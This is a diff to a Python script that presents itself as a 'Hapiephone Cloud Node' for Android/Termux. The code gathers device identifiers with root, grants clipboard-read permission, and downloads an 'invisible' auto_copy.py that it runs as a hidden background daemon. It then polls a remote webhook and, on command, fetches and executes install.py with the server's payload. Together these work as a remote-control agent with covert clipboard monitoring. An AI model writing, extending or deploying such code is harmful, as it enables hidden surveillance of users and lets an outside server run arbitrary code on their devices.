@@ -6,24 +6,29 @@ import json
 
 try:
     import requests
+    import gdown
+    from rich.console import Console
+    from rich.panel import Panel
+    from halo import Halo
 except ImportError:
-    print("📦 Installing network dependencies...")
-    os.system("pip install requests --upgrade -q > /dev/null 2>&1")
+    os.system("pip install requests gdown rich halo colorama --upgrade -q > /dev/null 2>&1")
     import requests
-
-try:
     import gdown
-except ImportError:
-    print("📦 Installing download engine...")
-    os.system("pip install gdown --upgrade -q > /dev/null 2>&1")
-    import gdown
+    from rich.console import Console
+    from rich.panel import Panel
+    from halo import Halo
 
-# Pega o diretório base para evitar erros de pasta não encontrada
+HAPIEPHONE_VERSION = "10"
+
+console = Console()
+
 BASE_DIR = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else os.getcwd()
 CONFIG_FILE = os.path.join(BASE_DIR, "hapie_config.json")
 FUNCTIONS_DIR = os.path.join(BASE_DIR, "functions")
 
 saved_config = {}
+
+console.print(Panel.fit(f"[bold cyan]Hapiephone Cloud Node[/bold cyan]\n[dim]Version {HAPIEPHONE_VERSION} | Powered by Evollogic[/dim]", border_style="cyan"))
 
 if os.path.exists(CONFIG_FILE):
     try:
@@ -54,13 +59,14 @@ if guild_id and owner_id:
     except:
         pass
 else:
-    print("❌ IDs missing. Exiting.")
+    console.print("[bold red]❌ Authentication IDs missing. Exiting.[/bold red]")
     sys.exit(1)
 
 URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
-
 report = {"installation_status": "pending", "steps": {}, "system_info": {}}
-print("🔄 Preparing your Cloud Phone environment...")
+
+spinner = Halo(text='Preparing Cloud Phone environment...', spinner='dots')
+spinner.start()
 
 os.system("pkg update -y -q > /dev/null 2>&1 && pkg upgrade -y -q > /dev/null 2>&1")
 
@@ -90,29 +96,28 @@ try:
 except:
     report["steps"]["pip_packages"] = "Failed"
 
+spinner.succeed("Environment verified and updated.")
 
-# --- NOVO SISTEMA DE LEITURA (Anti API 0) ---
+spinner = Halo(text='Scanning hardware data...', spinner='dots')
+spinner.start()
+
 def get_prop(command):
-    """Lê informações do sistema DE FORMA LIMPA (sem usar o Root)"""
     try:
         return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
     except:
         return "Unknown"
 
 def get_root_data(command):
-    """Usa Root apenas para as travas de segurança do ID"""
     try:
         return subprocess.check_output(f"su -c '{command}'", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
     except:
         return "Unknown"
 
-# --- CORREÇÃO: Função obter_ultima_atividade adicionada ---
-def obter_ultima_atividade():
-    """Lê o timestamp da última ação para evitar flood. Retorna 0 se falhar."""
-    caminho_timestamp = os.path.join(FUNCTIONS_DIR, "last_activity.txt")
+def get_last_activity():
+    timestamp_path = os.path.join(FUNCTIONS_DIR, "last_activity.txt")
     try:
-        if os.path.exists(caminho_timestamp):
-            with open(caminho_timestamp, "r") as f:
+        if os.path.exists(timestamp_path):
+            with open(timestamp_path, "r") as f:
                 return float(f.read().strip())
         return 0.0
     except Exception:
@@ -120,8 +125,6 @@ def obter_ultima_atividade():
 
 try:
     has_root = True if get_root_data("echo root_ok") == "root_ok" else False
-    
-    # Busca o hardware diretamente no sistema Android
     model = get_prop("getprop ro.product.model")
     android_version = get_prop("getprop ro.build.version.release")
     region = get_prop("getprop persist.sys.locale")
@@ -131,12 +134,10 @@ try:
     cpu_abi = get_prop("getprop ro.product.cpu.abi")
     processor = "64 bits" if "64" in cpu_abi else ("32 bits" if cpu_abi != "Unknown" and cpu_abi else "Unknown")
 
-    # Busca o ID de segurança com root (ou sem root se falhar)
     device_id = get_root_data("settings get secure android_id")
     if device_id == "Unknown" or not device_id:
         device_id = get_prop("settings get secure android_id")
 
-    # Limpeza para evitar que a API leia versões quebradas (ex: 11.0.1 -> 11)
     if android_version != "Unknown" and "." in android_version:
         android_version = android_version.split(".")[0]
 
@@ -154,120 +155,126 @@ except Exception as e:
     device_id = "Unknown"
 
 report["installation_status"] = "Completed"
-print("✅ Configuration finished! Connecting to control panel...")
+spinner.succeed(f"Hardware scan complete! Device ID: [bold]{device_id}[/bold]")
 
-def atualizar_client_token(novo_token):
+def update_client_token(new_token):
     global client_token
-    if novo_token and novo_token != client_token:
-        client_token = novo_token
+    if new_token and new_token != client_token:
+        client_token = new_token
         try:
             config = {}
             if os.path.exists(CONFIG_FILE):
                 with open(CONFIG_FILE, "r") as f:
                     config = json.load(f)
             config["client_token"] = client_token
-            
             with open(CONFIG_FILE, "w") as f:
                 json.dump(config, f)
-            print("🔑 [AUTH] Nova licença de segurança instalada no aparelho.")
+            console.print("[bold yellow]🔑 [AUTH] New security license installed on the device.[/bold yellow]")
         except Exception as e:
-            print(f"⚠️ [AUTH] Erro ao salvar o novo token: {e}")
+            console.print(f"[bold red]⚠️ [AUTH] Error saving new token: {e}[/bold red]")
 
-print("🚀 Starting background services (Auto-Copy)...")
+spinner = Halo(text='Deploying background modules...', spinner='dots')
+spinner.start()
 try:
     os.system("pkill -f auto_copy.py > /dev/null 2>&1")
     os.system(f"mkdir -p {FUNCTIONS_DIR}")
     
     copy_script_path = os.path.join(FUNCTIONS_DIR, "auto_copy.py")
     log_script_path = os.path.join(FUNCTIONS_DIR, "copy_log.txt")
-    
     os.system(f"rm -rf {copy_script_path} > /dev/null 2>&1")
     
     v_cache = int(time.time())
     URL_COPY_PY = f"https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/functions/auto_copy.py?v={v_cache}"
     os.system(f"curl -sL '{URL_COPY_PY}' -o {copy_script_path} > /dev/null 2>&1")
     
-    caminho_python = sys.executable
+    python_path = sys.executable
     subprocess.run('su -c "appops set com.termux READ_CLIPBOARD allow" 2>/dev/null', shell=True)
     
-    comando_daemon = f"nohup {caminho_python} {copy_script_path} {device_id} {guild_id} {owner_id} > {log_script_path} 2>&1 &"
-    os.system(comando_daemon)
-    print(f"✅ Invisible module deployed successfully! (Logs at functions/copy_log.txt)")
+    daemon_cmd = f"nohup {python_path} {copy_script_path} {device_id} {guild_id} {owner_id} > {log_script_path} 2>&1 &"
+    os.system(daemon_cmd)
+    spinner.succeed("Invisible module deployed successfully! (Listening in background)")
 except Exception as e:
-    print(f"⚠️ Error deploying module: {e}")
+    spinner.fail(f"Error deploying module: {e}")
 
-registrado_no_banco = False
-INTERVALO_PING = 15 
-ultima_checagem = 0 
+registered_in_db = False
+PING_INTERVAL = 15 
+last_check = 0 
 
-while True:
-    agora = time.time()
-    ultima_acao = max(ultima_checagem, obter_ultima_atividade())
-    
-    if agora - ultima_acao >= INTERVALO_PING or not registrado_no_banco:
-        try:
-            report_payload = report 
-            
-            payload = {
-                "type": 1 if registrado_no_banco else 0, 
-                "guild_id": guild_id, 
-                "owner_id": owner_id, 
-                "device_id": device_id,
-                "status": "online", 
-                "report": report_payload,
-                "client_token": client_token 
-            }
-            
-            headers = {"Content-Type": "application/json"}
-            # Ele envia as requisições pro seu Vercel (onde está o webhook que você fixou)
-            response = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=15)
-            
-            if response.status_code == 200:
-                resposta_json = response.json()
+console.print("\n[bold green]📡 Connection established. Awaiting commands from Control Panel...[/bold green]\n[dim](Press CTRL+C at any time to disconnect safely)[/dim]\n")
+
+try:
+    while True:
+        now = time.time()
+        last_action = max(last_check, get_last_activity())
+        
+        if now - last_action >= PING_INTERVAL or not registered_in_db:
+            try:
+                payload = {
+                    "type": 1 if registered_in_db else 0, 
+                    "guild_id": guild_id, 
+                    "owner_id": owner_id, 
+                    "device_id": device_id,
+                    "status": "online", 
+                    "report": report,
+                    "client_token": client_token,
+                    "version": HAPIEPHONE_VERSION
+                }
                 
-                print(f"📦 Resposta recebida do Vercel: {resposta_json}")
+                headers = {"Content-Type": "application/json"}
+                response = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=15)
                 
-                if "new_client_token" in resposta_json:
-                    atualizar_client_token(resposta_json["new_client_token"])
-                
-                if resposta_json.get("status") == "shutdown":
-                     print(f"🛑 [SISTEMA] Servidor recusou a conexão: {resposta_json.get('motivo')}")
-                     print("Encerrando serviços...")
-                     sys.exit(1)
-                     
-                if not registrado_no_banco:
-                    print("🚀 Device synchronized and actively listening for commands!")
-                    registrado_no_banco = True
+                if response.status_code == 200:
+                    response_json = response.json()
                     
-                ultima_checagem = time.time() 
-
-                if "instalar" in resposta_json or "comandos" in resposta_json:
-                    os.system(f"mkdir -p {FUNCTIONS_DIR}")
-                    install_script_path = os.path.join(FUNCTIONS_DIR, "install.py")
+                    if "instalar" in response_json or "comandos" in response_json:
+                        console.print(f"[bold magenta]📦 Vercel Payload Received:[/bold magenta] {response_json}")
                     
-                    if not os.path.exists(install_script_path):
-                        print("📥 Baixando Install Engine (functions/install.py)...")
-                        v_cache_install = int(time.time())
-                        URL_INSTALL = f"https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/functions/install.py?v={v_cache_install}"
-                        os.system(f"curl -sL '{URL_INSTALL}' -o {install_script_path}") 
+                    if "new_client_token" in response_json:
+                        update_client_token(response_json["new_client_token"])
+                    
+                    if response_json.get("status") == "shutdown":
+                         console.print(f"[bold red]🛑 [SYSTEM] Server refused connection: {response_json.get('motivo')}[/bold red]")
+                         console.print("[dim]Shutting down services...[/dim]")
+                         sys.exit(1)
+                         
+                    if not registered_in_db:
+                        console.print("[bold cyan]🚀 Device synchronized and actively listening![/bold cyan]")
+                        registered_in_db = True
+                        
+                    last_check = time.time() 
 
-                    tasks_str = json.dumps(resposta_json)
-                    try:
-                        print("⚡ Acionando functions/install.py...")
-                        subprocess.run([sys.executable, install_script_path, tasks_str], check=True)
-                    except subprocess.CalledProcessError as err:
-                        print(f"❌ O install.py falhou ao rodar. Código de erro: {err.returncode}")
-                    except Exception as err:
-                        print(f"❌ Falha inesperada ao tentar chamar o script: {err}")
+                    if "instalar" in response_json or "comandos" in response_json:
+                        os.system(f"mkdir -p {FUNCTIONS_DIR}")
+                        install_script_path = os.path.join(FUNCTIONS_DIR, "install.py")
+                        
+                        if not os.path.exists(install_script_path):
+                            with Halo(text='Downloading Install Engine...', spinner='dots'):
+                                v_cache_install = int(time.time())
+                                URL_INSTALL = f"https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/functions/install.py?v={v_cache_install}"
+                                os.system(f"curl -sL '{URL_INSTALL}' -o {install_script_path}") 
 
-            else:
-                print(f"⚠️ Connection refused by Vercel! HTTP Code: {response.status_code}")
-                if response.status_code != 502: 
-                    try:
-                        print(f"Motivo: {response.json().get('motivo', 'Unknown Error')}")
-                    except:
-                        pass
-        except Exception as e:
-            print(f"📡 Network error or server down: {e}")
-            
-    time.sleep(10)
+                        tasks_str = json.dumps(response_json)
+                        try:
+                            console.print("[bold yellow]⚡ Triggering installation engine...[/bold yellow]")
+                            subprocess.run([sys.executable, install_script_path, tasks_str], check=True)
+                        except subprocess.CalledProcessError as err:
+                            console.print(f"[bold red]❌ Install engine failed. Error code: {err.returncode}[/bold red]")
+                        except Exception as err:
+                            console.print(f"[bold red]❌ Unexpected failure when calling the engine: {err}[/bold red]")
+
+                else:
+                    console.print(f"[bold red]⚠️ Connection refused by server! HTTP Code: {response.status_code}[/bold red]")
+            except Exception as e:
+                pass
+                
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    console.print("\n\n[bold red]🛑 Stop signal received (CTRL+C).[/bold red]")
+    shutdown_spinner = Halo(text='Shutting down background services safely...', spinner='dots')
+    shutdown_spinner.start()
+    os.system("pkill -f auto_copy.py > /dev/null 2>&1")
+    time.sleep(1)
+    shutdown_spinner.succeed('All Evollogic services stopped.')
+    console.print("[bold green]✅ Node disconnected safely. Goodbye![/bold green]\n")
+    sys.exit(0)
